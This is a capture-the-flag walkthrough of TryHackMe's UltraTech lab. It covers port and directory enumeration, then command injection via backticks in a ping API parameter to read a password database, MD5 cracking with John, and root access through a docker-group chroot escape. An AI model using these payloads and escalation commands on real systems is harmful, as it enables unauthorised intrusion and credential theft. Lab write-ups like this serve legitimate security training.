---
layout: post
title: "THM UltraTech Writeup"
date: "2021-06-14"
categories: tryhackme
---
## Room
**Name**: UltraTech

**Location**: [TryHackMe](https://tryhackme.com/room/ultratech1)

**Description**: The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing

**Difficulty**: Medium

## Network Enumeration
First of all, let's start our initial enumeration of our target using `nmap`.

```sh
# Nmap 7.91 scan initiated Mon Jun 14 17:32:49 2021 as: nmap -sC -sV -oN allports -p- -vv 10.10.219.52
Increasing send delay for 10.10.219.52 from 0 to 5 due to 43 out of 143 dropped probes since last increase.
Nmap scan report for 10.10.219.52
Host is up, received conn-refused (0.38s latency).
Scanned at 2021-06-14 17:32:49 PST for 1807s
Not shown: 65531 closed ports
Reason: 65531 conn-refused
PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiFl7iswZsMnnI2RuX0ezMMVjUXFY1lJmZr3+H701ZA6nJUb2ymZyXusE/wuqL4BZ+x5gF2DLLRH7fdJkdebuuaMpQtQfEdsOMT+JakQgCDls38FH1jcrpGI3MY55eHcSilT/EsErmuvYv1s3Yvqds6xoxyvGgdptdqiaj4KFBNSDVneCSF/K7IQdbavM3Q7SgKchHJUHt6XO3gICmZmq8tSAdd2b2Ik/rYzpIiyMtfP3iWsyVgjR/q8oR08C2lFpPN8uSyIHkeH1py0aGl+V1E7j2yvVMIb4m3jGtLWH89iePTXmfLkin2feT6qAm7acdktZRJTjaJ8lEMFTHEijJ
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLy2NkFfAZMY462Bf2wSIGzla3CDXwLNlGEpaCs1Uj55Psxk5Go/Y6Cw52NEljhi9fiXOOkIxpBEC8bOvEcNeNY=
|   256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEipoohPz5HURhNfvE+WYz4Hc26k5ObMPnAQNoUDsge3
8081/tcp  open  http    syn-ack Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn\'t have a title (text/html; charset=utf-8).
31331/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 14 18:02:56 2021 -- 1 IP address (1 host up) scanned in 1807.14 seconds
```

Point of interest here are the services on port `8081` and `31331`. FTP can also be of interest but it doesn't seem
to allow Anonymous access, so we need to do further enumeration before trying to exploit the FTP service.

Let's move forward with Web App enumeration.

## Web App on port 8081 Enumeration
Upon visiting the website on a browser, we are greeted by a page with the text "UltraTech API v0.1.3". Nothing much to do here.

So let's proceed with directory busting using GoBuster.

```
$ gobuster dir -u http://10.10.219.52:8081/ -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.219.52:8081/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/14 18:31:54 Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
                                                
===============================================================
2021/06/14 18:34:51 Finished
===============================================================
```

We've only gotten two results which is `/auth` and `/ping`, so let's visit them to continue with our enumeration.

Upon visiting `/auth` we are greeted with a message "You must specify a login and a password". We don't have a username yet so let's skip bruteforcing for now
and continue with the enumeration.

Upon visiting `/ping`, we are greeted wiht a JavaScript error message. It looks like this page is expecting some parameters.

```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

I tried playing with the URL to no avail, so I decided to move forward and continue my enumeration on the next port.

## Web App on port 31331 Enumeration
Continuing with our enumeration, we now visit the website on a browser. We are greeted with a landing page.

![](/assets/images/thm-ultratech/screenshot_1.png)

Looking through the contents, there's not much to it other than the `ultratech@yopmail.com` email address on "Contact Us NOW" button.

Let's save this email somewhere since this can be used later for bruteforcing the `/auth` endpoint.

Moving forward, let's do directory busting using GoBuster.

```
$ gobuster dir -u http://10.10.219.52:31331/ -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.219.52:31331/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/14 18:36:29 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 294]
/.htaccess            (Status: 403) [Size: 299]
/.htpasswd            (Status: 403) [Size: 299]
/css                  (Status: 301) [Size: 319] [--> http://10.10.219.52:31331/css/]
/favicon.ico          (Status: 200) [Size: 15086]                                   
/images               (Status: 301) [Size: 322] [--> http://10.10.219.52:31331/images/]
/index.html           (Status: 200) [Size: 6092]                                       
/javascript           (Status: 301) [Size: 326] [--> http://10.10.219.52:31331/javascript/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.219.52:31331/js/]        
/robots.txt           (Status: 200) [Size: 53]                                             
/server-status        (Status: 403) [Size: 303]                                            
                                                                                           
===============================================================
2021/06/14 18:39:27 Finished
===============================================================
```

We see that there's a `robots.txt`, let's check it for any clues.

```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

Looks like we have an interesting path here, let's visit it and see its contents.

The contents of `utech_sitemap.txt` are more hidden paths.

```
/
/index.html
/what.html
/partners.html
```

Visiting `index.html` only leads back to the welcome page, while visiting `what.html` leads us to an incomplete page.

![](/assets/images/thm-ultratech/screenshot_2.png)

_felt bad for the unpaid intern, lol._

Visiting `partners.html` leads us to a login page

![](/assets/images/thm-ultratech/screenshot_3.png)

## Getting initial access
Now that we have a potential attack vector, which is the login page. Let's start thinking of getting initial access into the target's system.

I tried bruteforcing my way into this login page using Hydra but after almost an hour of trying, it seems like my effort is going nowhere.

So I decided to check the source code for this page and found an interesting function in `api.js`.

```js
function checkAPIStatus() {
    const req = new XMLHttpRequest();
    try {
        const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
        req.open('GET', url, true);
        req.onload = function (e) {
        if (req.readyState === 4) {
            if (req.status === 200) {
            console.log('The api seems to be running')
            } else {
            console.error(req.statusText);
            }
        }
        // ... TRIM
    }
    // ... TRIM
}
```

What this function does is, it calls on the `/ping` path of the API that is on port `8081` and pings the ip address that is given to the `ip` parameter.

We can also notice that this function is being called every now and then.

![](/assets/images/thm-ultratech/screenshot_4.png)

Since the parameter accepts not just the value of `window.location.hostname` but also other values which can be vulnerable to code injection or remote code execution.

I played around the potential values until I came across with escaping the commands using backticks (\`). Using **http://10.10.219.52:8081/ping?ip=\`ls\`** we managed to see an interesting database backup file.

```
ping: u****.db.******: Name or service not known 
```

Now that we can execute commands, we can check the content of this database backup using **http://10.10.219.52:8081/ping?ip=\`cat u\*\*\*\*.db.\*\*\*\*\*\*\`**.

```
ping: ) ���(Mr00tf357a0c5279*********************)Madmin0d0ea5111e3*********************: Parameter string not correctly encoded 
```

We can see the hashes of both `r00t` and `admin` users. Save the hashes in a new file then use John The Ripper to crack the hash.
```
$ john root_password.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]          (?)
1g 0:00:00:00 DONE (2021-06-14 18:45) 2.702g/s 14173Kp/s 14173Kc/s 14173KC/s n102983..n0valyf
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

Now that we have the plain password of the user `r00t`, we can now login using SSH.

## Foothold & getting root via Docker
And we're in!

```
$ id

uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

There's no user flag in this room, only a root flag. So let's start thinking of ways to escalate to root.

I tried a different ways to try to escalate to root, however they all failed, until I remembered that my current account has access to `docker` group.

Further search led me to this page on [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell). With a little tweak, we came out with the following.

```
$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

Upon trying the docker command, I successfully managed to get a root shell and retrieve the private RSA key.

```
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cd /root
# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
[REDACTED]
-----END RSA PRIVATE KEY-----
```
